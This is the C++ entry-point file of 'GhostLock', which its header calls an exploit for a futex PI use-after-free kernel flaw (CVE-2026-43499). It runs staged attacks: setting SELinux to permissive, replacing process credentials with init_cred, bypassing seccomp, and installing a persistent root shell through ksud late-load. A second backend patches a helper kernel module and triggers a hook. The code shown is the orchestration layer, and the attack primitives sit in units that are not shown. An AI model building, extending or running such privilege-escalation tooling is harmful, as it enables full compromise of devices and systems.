/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::backend::victim, ghostlock::race and ghostlock::session::stages.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "support/log.hpp"

#include <cstdint>

#include "profile/entry.h"
#include "backend/cve_2026_43284/entry.hpp"
#include "plugin/probe.hpp"
#include "support/cli.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"
#include "pipeline/orchestrator.hpp"

#include <array>
#include <memory>
#include <string>
#include <string_view>

#include <unistd.h>

using namespace ghostlock;


int main(int argc, char **argv) {
    try {
        support::cli::Options options{};
        support::cli::ParseError parse_error;
        if (!support::cli::parse_arguments(argc, argv, options, parse_error)) {
            switch (parse_error) {
                case support::cli::ParseError::MultipleEntrypoints:
                    pr_error("choose one entrypoint\n");
                    break;
                case support::cli::ParseError::StatusRequiresAppCall:
                    pr_error("--enable-status-record requires --ghostlock-app-call\n");
                    break;
                case support::cli::ParseError::ProbeConflict:
                    pr_error("--probe-cve-2026-43284 cannot be combined with other flags\n");
                    break;
                case support::cli::ParseError::PluginProbeConflict:
                    pr_error("--plugin-probe cannot be combined with other flags\n");
                    break;
                case support::cli::ParseError::ExpectShaRequiresPluginProbe:
                    pr_error("--expect-sha256 requires --plugin-probe\n");
                    break;
                default:
                    pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin> |"
                             " --probe-cve-2026-43284 <ko-path> |"
                             " --plugin-probe <path.so> [--expect-sha256 <hex>]]"
                             " [--allow-dev-target] [--dump-kernel-log <dir>]"
                             " [--force-attack] [--enable-status-record]\n",
                             argv[0]);
                    pr_error("  selection and policy come from the GLK profile: the staged"
                             " --run-cve-2026-43284/--stage/--plugin entry and the"
                             " --cve43284-* selectors were removed in S4 R2b, so a dev"
                             " replay uses --ghostlock-app-call with the same document and"
                             " the same pipeline as production.\n");
                    break;
            }
            return 1;
        }
        if (options.mode == support::cli::Mode::ProbeCve2026_43284) {
            return backend::cve_2026_43284::entry::run_diagnostic(
                    options.probe_module_path);
        }
        if (options.mode == support::cli::Mode::PluginProbe) {
            /* S4 P1: read-only plugin description; never registers or runs a
             * hook and never touches a profile or stdin. */
            return plugin::run_plugin_probe(options.plugin_probe_path,
                                            options.expect_sha256);
        }
        const bool app_call = options.mode == support::cli::Mode::AppCall;
        const bool force_attack = options.force_attack;
        const bool status_record = options.status_record;
        const char *prebuilt_path = options.load_prebuilt_profile;
        const char *dump_dir = options.dump_kernel_log;
        support::run_state::configure(status_record);

        profile_entry::ReadResult read;
        if (prebuilt_path != nullptr) {
            read = profile_entry::read_glk1_file(prebuilt_path);
        } else if (app_call) {
            read = status_record ? profile_entry::read_glk1_frame_stdin()
                                 : profile_entry::read_glk1_stdin();
        } else {
            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
            return 1;
        }
        if (read.error != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }
        /* The wire selection: v2 carries numeric ids, GLKv3 carries component
         * tokens. Resolving the tokens is composition-root work because the
         * component vocabulary lives in the catalogue, not in the transport. */
        profile::Document &decoded = read.document;
        if (!decoded.backend_token.empty()) {
            contract::BackendKind backend_kind{};
            if (!pipeline::backend_from_token(decoded.backend_token, backend_kind)) {
                pr_error("cannot load profile\n");
                throw FatalError{};
            }
            decoded.backend = static_cast<uint16_t>(backend_kind);
        }
        if (!decoded.terminal_token.empty()) {
            contract::TerminalKind terminal_kind{};
            if (!pipeline::terminal_from_token(decoded.terminal_token, terminal_kind)) {
                pr_error("cannot load profile\n");
                throw FatalError{};
            }
            decoded.terminal = static_cast<uint16_t>(terminal_kind);
        }

        auto &session = session::g_exploit_session;
        /* Route is backend-internal (ADR-0004 R12): the backend reads it from
         * the bound profile; the selection carries only backend/steps/terminal. */
        const contract::ComponentSelection selection{
            .backend = static_cast<contract::BackendKind>(decoded.backend),
            .steps = pipeline::wire_stepset(decoded),
            .terminal = static_cast<contract::TerminalKind>(decoded.terminal),
        };
        /* B5-1 (channel B): only the cve_2026_43284 backend MAY be followed by
         * the optional runtime session-secret frame on the same stdin, after
         * the length-prefixed GLKv3 document. Every other backend -- 43499
         * included -- never reads it, so their stdin/status-ACK behavior is
         * unchanged. On the 43284 path an absent or malformed frame is
         * fail-closed. The secrets stay process-local and are zeroized at scope
         * exit; they never reach a profile, a file, argv or a log. */
        backend::cve_2026_43284::entry::ProductionSession production{};
        if (app_call && status_record &&
            selection.backend == contract::BackendKind::Cve2026_43284) {
            if (!production.read_side_channel(STDIN_FILENO)) {
                pr_error("session secret frame rejected\n");
                throw FatalError{};
            }
        }
        if (!contract::selection_supported(selection)) {
            /* Known-but-unavailable ids land here (unknown ids were rejected at
             * decode time), named for diagnosis. */
            const std::string terminal(pipeline::terminal_name(selection.terminal));
            const std::string backend(pipeline::backend_name(selection.backend));
            const std::string steps(pipeline::stepset_name(selection.steps));
            const std::string route(pipeline::middleware_name(
                static_cast<pipeline::MiddlewareKind>(decoded.middleware)));
            pr_error("unsupported component selection: backend=%s steps=%s terminal=%s route=%s\n",
                     backend.c_str(), steps.c_str(), terminal.c_str(), route.c_str());
            throw FatalError{};
        }
        /* B6/T5 production seam. The orchestrator routes app-call 43284 through
         * Pipeline, but the per-run resources are composition-root facts: the
         * helper.ko module mirror + write plan, the single carrier, the real
         * chain ops, the session secrets and the read-only UMH readiness probe.
         * Install them into the 43284 state before dispatch; a failed bind is
         * fail-closed and never reaches patch #1 / hook / trigger. The
         * resources outlive the pipeline call and the pipeline's RAII guard
         * destroys the state on every exit path.
         *
         * Availability is intentionally still false in this batch (see
         * contract/identity.hpp for the one-line flip): the gate above rejects
         * 43284, so this seam is dormant until the main agent enables it after
         * the app-call device gate. */
        if (selection.backend == contract::BackendKind::Cve2026_43284) {
            const std::uint8_t bind_error =
                    production.bind(session, decoded, options.allow_dev_target);
            if (bind_error != 0U) {
                pr_error("cve_2026_43284 production binding failed (%d)\n",
                         static_cast<int>(bind_error));
                throw FatalError{};
            }
        }
        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
         * directly (backend steps + terminal handoff). DiagnosticStop is a
         * successful early stop (objective already met), not a full run. */
        const pipeline::RunResult result = pipeline::run_orchestrated_pipeline(
            session, selection, decoded, dump_dir, force_attack);
        switch (result.code) {
            case pipeline::RunCode::Rejected:
                pr_error("orchestrator rejected the component selection\n");
                throw FatalError{};
            case pipeline::RunCode::Failed:
                /* Name the failing stage: the backend/terminal report carries the
                 * detailed reason, but a silent exit 1 is undiagnosable from the
                 * App, which only sees the process status. */
                pr_error("orchestrated pipeline failed at stage=%d\n",
                         static_cast<int>(result.stage));
                return 1;
            case pipeline::RunCode::Completed:
            case pipeline::RunCode::DiagnosticStop:
                return 0;
        }
        throw FatalError{};
    } catch (const FatalError &) {
        return 1;
    }
}
